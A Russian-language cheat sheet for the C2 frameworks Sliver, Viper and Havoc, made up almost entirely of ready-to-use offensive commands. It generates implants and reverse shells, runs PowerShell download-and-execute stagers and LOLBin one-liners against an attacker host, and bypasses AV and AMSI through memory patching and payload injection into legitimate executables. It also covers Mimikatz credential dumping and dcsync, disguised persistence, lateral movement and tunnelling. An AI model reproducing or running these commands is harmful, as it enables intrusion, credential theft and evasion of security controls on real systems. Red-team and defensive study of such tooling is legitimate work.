# 🎮 C2 Frameworks Cheat Sheet

**Полное руководство по работе с C2 фреймворками.**  
Включает техники для Sliver, Viper, Havoc — создание стейджеров, обход AV, пост-эксплуатация.

---

## 📚 Оглавление
1. [Sliver C2](#-sliver-c2)
2. [Viper C2](#-viper-c2)
3. [Havoc C2](#-havoc-c2)
4. [Создание стейджеров](#-создание-стейджеров)
5. [Обход антивирусов (AV Bypass)](#-обход-антивирусов-av-bypass)
6. [Пост-эксплуатация](#-пост-эксплуатация)
7. [Туннелирование и обход сетевых ограничений](#-туннелирование-и-обход-сетевых-ограничений)
8. [Полезные инструменты](#-полезные-инструменты)

---

## 🐚 Sliver C2

### 1.1 Установка Sliver

```bash
# Быстрая установка
curl https://sliver.sh/install | sudo bash

# Или из исходников
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
sudo make install

# Запуск сервера
sliver-server

1.2 Основные команды Sliver
# Информация о сервере
info
version

# Настройка слушателей
http -l 8080
https -l 443
mtls -l 8888
dns -l 53

# Просмотр активных слушателей
jobs

# Остановка слушателя
kill <job_id>

1.3 Генерация имплантов
# Базовый имплант
generate --http 10.10.10.10:8080 --os windows --arch amd64 --save /tmp/sliver.exe

# С обфускацией и защитой
generate --http 10.10.10.10:8080 --os windows --arch amd64 --format exe --seconds 30 --jitter 5 --reconnect-interval 60 --max-errors 3 --save /tmp/sliver_obf.exe

# С кастомным именем процесса
generate --http 10.10.10.10:8080 --os windows --arch amd64 --name svchost.exe --save /tmp/svchost.exe

# Shellcode формат (для инжекта)
generate --http 10.10.10.10:8080 --os windows --arch amd64 --format shellcode --save /tmp/sliver.bin

# С профилем (переиспользование настроек)
profiles new --http 10.10.10.10:8080 --os windows --arch amd64 win_profile
generate --profile win_profile --save /tmp/sliver.exe

1.4 Работа с сессиями
# Просмотр активных сессий
sessions
sessions -i <id>

# Интерактивная сессия
use <session_id>

# Команды внутри сессии
help
shell                    # Интерактивный шелл
info                     # Информация о системе
ps                       # Список процессов
ls                       # Листинг файлов
cd                       # Смена директории
download <file>          # Скачать файл
upload <local> <remote>  # Загрузить файл
screenshot               # Скриншот

1.5 Пост-эксплуатация в Sliver
# Миграция процесса
migrate -n explorer.exe
migrate -p <pid>

# Повышение привилегий
getsystem

# Дамп паролей
mimikatz
make_token <domain> <username> <password>

# Выполнение команд от SYSTEM
execute -o -t SYSTEM "whoami"

# Бэкдор
persistence --schtasks --name "Updater" --time 09:00 --command "C:\Windows\Temp\backdoor.exe"

1.6 Продвинутые техники Sliver
# Запуск шелла на Cobalt Strike
execute-assembly /path/to/SharpHound.exe

# Использование Beacon режима
generate --http 10.10.10.10:8080 --os windows --arch amd64 --beacon 60 --save beacon.exe

# Загрузка расширений
extensions install /path/to/extensions
extensions load <name>

# Туннелирование
socks5 start
portfwd add --remote 127.0.0.1:3389 --local 13389

Viper C2
2.1 Установка Viper (Docker)
# Клонирование репозитория
git clone https://github.com/FunnyWolf/Viper
cd Viper

# Запуск через Docker Compose
docker-compose up -d

# Доступ к веб-интерфейсу
https://localhost:60000

# Логин/пароль по умолчанию
# root / viper (меняется при первом входе)

2.2 Основные возможности Viper
# Интерфейс Viper (через CLI)
python3 console.py

# Основные команды
help
sessions                  # Список сессий
listeners                 # Список слушателей
payload                   # Генерация пейлоадов

2.3 Генерация пейлоадов в Viper
# Через веб-интерфейс
Payloads -> Add
  - Type: Reverse HTTP
  - LHOST: 10.10.10.10
  - LPORT: 8080
  - Format: exe
  - Arch: x64

# Через CLI
payload create --platform windows --arch x64 --format exe --lhost 10.10.10.10 --lport 8080 --type reverse_http --output /tmp/viper.exe

2.4 Интеграция Viper с Metasploit
# В Viper
msfconsole

# В Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 8080
run

2.5 Пост-эксплуатация в Viper
# В сессии Viper
help

# Файловые операции
download C:\Windows\System32\config\SAM /tmp/sam
upload /tmp/shell.exe C:\Windows\Temp\shell.exe

# Системные команды
execute whoami
execute -s cmd.exe /c "net user"

# Дополнительные модули
load kiwi              # Mimikatz
load powershell        # PowerShell модули

 Havoc C2
3.1 Установка Havoc
# Клонирование репозитория
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Установка зависимостей
./Install.sh

# Сборка Teamserver
cd Teamserver
go build
cd ..

# Сборка Client
cd Client
make
cd ..

# Запуск Teamserver
./Teamserver/teamserver server --profile ./profiles/havoc.yaotl

# Запуск клиента
./Client/Havoc

3.2 Настройка слушателей Havoc
# В клиенте Havoc
Listeners -> Add
  - Name: http_listener
  - Type: HTTP
  - Host: 0.0.0.0
  - Port: 80
  - BindIP: 10.10.10.10

# HTTPS Listener
  - Type: HTTPS
  - SSL: true
  - Cert: /path/to/cert.pem
  - Key: /path/to/key.pem

3.3 Генерация демонов Havoc
# Через GUI
Attack -> Payload
  - Listener: http_listener
  - Format: Windows Exe
  - Arch: x64
  - Output: /tmp/havoc.exe

# Команды в агенте
help
shell
upload
download
screenshot
keylog

3.4 Havoc пост-эксплуатация
# В интерактивной сессии
pwd
ls
cd
cat
exec whoami
exec net user

# Дополнительные модули
sharp <assembly>         # Выполнение .NET сборки
psinject <pid> <script>  # Инъекция PowerShell скрипта
screenshot               # Скриншот
keylog                   # Кейлоггер
portscan                 # Сканирование портов

 Создание стейджеров
4.1 MSFVenom (базовые стейджеры)
# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o meterpreter.exe

# Shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c -o shell.c

# PowerShell (без диска)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f powershell -o shell.ps1

4.2 Donut (Shellcode генерация)
# Конвертация EXE в shellcode
donut -f /path/to/beacon.exe -o beacon.bin

# С параметрами
donut -f /path/to/beacon.exe -a 2 -o beacon.bin -z 2 -e 1

# Архитектуры
# -a 1 = x86, -a 2 = x64, -a 3 = x86+x64

4.3 Shellter (Инъекция в легитимные EXE)
# Запуск Shellter
sudo shellter

# Выбор легитимного EXE (например, putty.exe)
# Выбор режима: Stealth
# Вставка пейлоада: Custom Shellcode
# Порт и IP для reverse shell

4.4 PowerShell стейджеры
# Base64 закодированный пейлоад
$command = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10/Invoke-PowerShellTcp.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded

# Запуск
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $encoded

Обход антивирусов (AV Bypass)
5.1 Обфускация кода
# Использование msfvenom с кодировщиками
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o obfuscated.exe

# Veil-Evasion (обфускация)
veil
use 1          # Python обфускация
use 12         # Windows reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
generate

5.2 Шифрование и упаковка
# UPX упаковка
upx --best --ultra-brute shell.exe -o packed.exe

# Шифрование через Hyperion
hyperion.exe shell.exe encrypted.exe

# Использование защитных оболочек
# Enigma Protector
# Themida
# VMProtect

5.3 Разделение на части (Staged Payloads)
# Stage 0 - стейджер (маленький)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 --smallest -f exe -o stager.exe

# Stage 1 - загрузчик (через PowerShell)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/stage2.ps1')"

# Stage 2 - основной пейлоад
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f powershell -o stage2.ps1

5.4 Process Injection
# Reflective PE Injection
# Использование PowerSploit
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcName "notepad"

# Execute-Assembly
execute-assembly /path/to/SharpHound.exe

# Непрямое выполнение
# Использование rundll32, mshta, regsvr32, wmic
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')");

mshta.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1'))"

regsvr32.exe /u /n /s /i:http://10.10.10.10/reg.sct scrobj.dll

5.5 AMSI Bypass
powershell
# AMSI обход через Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Patch AMSI
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

# AMSI Patch для PowerShell
$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)

Пост-эксплуатация
6.1 Дамп паролей (Mimikatz)
bash
# Sliver
mimikatz
  privilege::debug
  sekurlsa::logonpasswords
  lsadump::sam
  lsadump::dcsync /user:krbtgt

# Вручную
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "lsadump::sam" "exit"

6.2 Лотеральное перемещение
# Psexec
impacket-psexec domain/user:pass@10.10.10.10

# WMI
impacket-wmiexec domain/user:pass@10.10.10.10

# WinRM
impacket-psExec domain/user:pass@10.10.10.10

# PowerShell Remoting
Enter-PSSession -ComputerName 10.10.10.10 -Credential domain\user

6.3 Сбор информации (SharpHound)
# Запуск SharpHound
execute-assembly SharpHound.exe -c All -d domain.local

# Через PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"

Туннелирование и обход сетевых ограничений
7.1 Chisel (туннелирование)
# На сервере (атакующем)
chisel server -p 8080 --reverse

# На целевой машине
chisel client 10.10.10.10:8080 R:4444:127.0.0.1:3389

# Прокси SOCKS5
chisel client 10.10.10.10:8080 R:socks

7.2 Ligolo-Ng
# На сервере
ip link add ligolo type dummy
ip link set ligolo up
ip addr add 240.0.0.1/32 dev ligolo

# Запуск proxy
./proxy -selfcert

# На целевой машине
./agent -connect 10.10.10.10:5555 -ignore-cert

7.3 SSH туннель
# Локальный порт-форвардинг
ssh -L 8080:target.internal:80 user@jumpbox

# Динамический SOCKS прокси
ssh -D 9050 user@jumpbox

# Обратный туннель (с целевой машины)
ssh -R 4444:localhost:22 user@attacker.com

 Полезные инструменты
Инструмент	Назначение
Sliver	C2 фреймворк на Go
Viper	Китайский C2 с веб-интерфейсом
Havoc	Современный C2 с GUI
Donut	Генерация shellcode из EXE
Shellter	Инъекция пейлоада в легитимные EXE
Veil	Обфускация пейлоадов
Chisel	Туннелирование через HTTP
Ligolo-Ng	Создание туннелей без администратора
Mimikatz	Дамп паролей и билетов
📚 Источники и дополнительная литература
Sliver Wiki

Viper GitHub

Havoc Framework

PayloadsAllTheThings — C2

The C2 Matrix

